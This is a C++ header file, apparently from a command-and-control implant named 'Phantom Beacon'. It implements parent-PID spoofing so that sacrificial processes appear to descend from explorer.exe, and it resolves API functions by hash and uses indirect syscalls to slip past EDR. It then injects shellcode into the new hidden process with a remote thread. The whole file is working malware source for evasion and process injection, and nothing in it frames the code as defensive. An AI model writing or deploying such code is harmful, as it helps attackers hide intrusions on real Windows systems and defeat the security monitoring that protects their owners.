#pragma once
// ============================================================================
//  ppid_spoof.h — Phantom Beacon PPID Spoofing
//  ──────────────────────────────────────────────────────────────
//  Spawns sacrificial processes with explorer.exe as the parent
//  instead of the beacon itself. This prevents EDR correlation
//  between the beacon and its spawned child processes.
//
//  Uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (Vista+) via
//  indirectly-syscalled CreateProcessA.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <cstring>
#include "syscalls.h"
#include "evasion.h"

namespace ppid {

// Hash for CreateProcessA — resolved dynamically
constexpr uint32_t FN_CREATEPROCESSA = 0x68CB3237;

// CLIENT_ID for NtOpenProcess (avoids winternl.h typedef ambiguity)
typedef struct _PPID_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} PPID_CLIENT_ID;

/// Find the PID of explorer.exe (or another trusted process)
inline DWORD find_trusted_parent_pid() {
    // Priority targets for parent PID spoofing
    static const char* trusted[] = {
        "explorer.exe",
        "svchost.exe",
        "winlogon.exe",
        "RuntimeBroker.exe",
        "taskhostw.exe",
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    DWORD found_pid = 0;
    if (Process32First(hSnapshot, &pe)) {
        do {
            for (auto& name : trusted) {
                if (_stricmp(pe.szExeFile, name) == 0) {
                    // Prefer explorer.exe (user-interactive, always present)
                    found_pid = pe.th32ProcessID;
                    if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                        CloseHandle(hSnapshot);
                        return found_pid;
                    }
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return found_pid;
}

/// Create a suspended process with a spoofed parent PID.
/// Returns true if the process was created successfully.
/// Uses indirect syscalls to avoid IAT entries for kernel32 functions.
inline bool create_with_spoofed_parent(
    const std::string& exe_path,
    HANDLE& hProcess,
    HANDLE& hThread,
    DWORD& dwPid,
    DWORD parent_pid = 0)
{
    if (parent_pid == 0)
        parent_pid = find_trusted_parent_pid();
    if (parent_pid == 0)
        return false;  // no trusted parent available

    // 1. Open the parent process
    HANDLE hParent = nullptr;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

    PPID_CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)parent_pid;
    cid.UniqueThread = nullptr;

    NTSTATUS status = syscalls::SysNtOpenProcess(
        &hParent,
        PROCESS_CREATE_PROCESS,
        &oa,
        &cid);
    if (status != 0 || !hParent) return false;

    // 2. Initialize process attributes for PPID spoofing
    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);

    std::vector<BYTE> attrBuf(attrListSize);
    auto lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attrBuf.data());

    if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attrListSize)) {
        syscalls::SysNtClose(hParent);
        return false;
    }

    if (!UpdateProcThreadAttribute(
            lpAttributeList, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent),
            nullptr, nullptr))
    {
        DeleteProcThreadAttributeList(lpAttributeList);
        syscalls::SysNtClose(hParent);
        return false;
    }

    // 3. Create the process suspended with CREATE_SUSPENDED
    STARTUPINFOEXA siEx = {};
    siEx.StartupInfo.cb = sizeof(siEx);
    siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    siEx.StartupInfo.wShowWindow = SW_HIDE;
    siEx.lpAttributeList = lpAttributeList;

    PROCESS_INFORMATION pi = {};

    // Resolve CreateProcessA via PEB
    auto pCreateProcessA = (BOOL(WINAPI*)(
        LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCSTR,
        LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEPROCESSA);

    if (!pCreateProcessA) {
        DeleteProcThreadAttributeList(lpAttributeList);
        syscalls::SysNtClose(hParent);
        return false;
    }

    // Build command line (copy because CreateProcessA may modify it)
    std::vector<char> cmdLine(exe_path.begin(), exe_path.end());
    cmdLine.push_back('\0');

    BOOL result = pCreateProcessA(
        nullptr,                    // lpApplicationName
        cmdLine.data(),             // lpCommandLine
        nullptr,                    // lpProcessAttributes
        nullptr,                    // lpThreadAttributes
        FALSE,                      // bInheritHandles
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,  // flags
        nullptr,                    // lpEnvironment
        nullptr,                    // lpCurrentDirectory
        &siEx.StartupInfo,          // lpStartupInfo
        &pi                         // lpProcessInformation
    );

    DeleteProcThreadAttributeList(lpAttributeList);
    syscalls::SysNtClose(hParent);

    if (!result) return false;

    hProcess = pi.hProcess;
    hThread = pi.hThread;
    dwPid = pi.dwProcessId;
    return true;
}

/// Migrate the beacon into a sacrificial process with spoofed PPID.
/// Creates RuntimeBroker.exe (or similar), injects shellcode, kills the
/// original thread, and returns the result string.
inline std::string migrate_with_spoofed_parent(
    const std::vector<unsigned char>& shellcode)
{
    static const char* targets[] = {
        "C:\\Windows\\System32\\RuntimeBroker.exe",
        "C:\\Windows\\System32\\rundll32.exe",
        "C:\\Windows\\SysWOW64\\rundll32.exe",
    };

    for (auto exe_path : targets) {
        HANDLE hProcess = nullptr, hThread = nullptr;
        DWORD dwPid = 0;

        if (!create_with_spoofed_parent(exe_path, hProcess, hThread, dwPid))
            continue;

        // Inject shellcode into the spawned process
        PVOID pRemoteBuf = nullptr;
        SIZE_T size = shellcode.size();

        NTSTATUS status = syscalls::SysNtAllocateVirtualMemory(
            hProcess, &pRemoteBuf, 0, &size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (status != 0) {
            syscalls::SysNtClose(hThread);
            syscalls::SysNtClose(hProcess);
            continue;
        }

        status = syscalls::SysNtWriteVirtualMemory(
            hProcess, pRemoteBuf,
            (PVOID)shellcode.data(), shellcode.size(), nullptr);

        if (status != 0) {
            syscalls::SysNtClose(hThread);
            syscalls::SysNtClose(hProcess);
            continue;
        }

        DWORD oldProtect;
        SIZE_T protectSize = shellcode.size();
        PVOID protectAddr = pRemoteBuf;
        syscalls::SysNtProtectVirtualMemory(
            hProcess, &protectAddr, &protectSize,
            PAGE_EXECUTE_READ, &oldProtect);

        HANDLE hRemoteThread = nullptr;
        status = syscalls::SysNtCreateThreadEx(
            &hRemoteThread, THREAD_ALL_ACCESS, nullptr,
            hProcess, (PVOID)pRemoteBuf, nullptr, FALSE,
            0, 0, 0, nullptr);

        if (status != 0) {
            syscalls::SysNtClose(hThread);
            syscalls::SysNtClose(hProcess);
            continue;
        }

        // Kill the original suspended thread
        TerminateThread(hThread, 0);

        syscalls::SysNtClose(hRemoteThread);
        syscalls::SysNtClose(hThread);
        syscalls::SysNtClose(hProcess);

        return "Migrated successfully (PPID spoofed) to PID " +
               std::to_string(dwPid) +
               " (parent: explorer.exe)";
    }
    return "Failed to migrate with PPID spoofing";
}

}  // namespace ppid
#endif
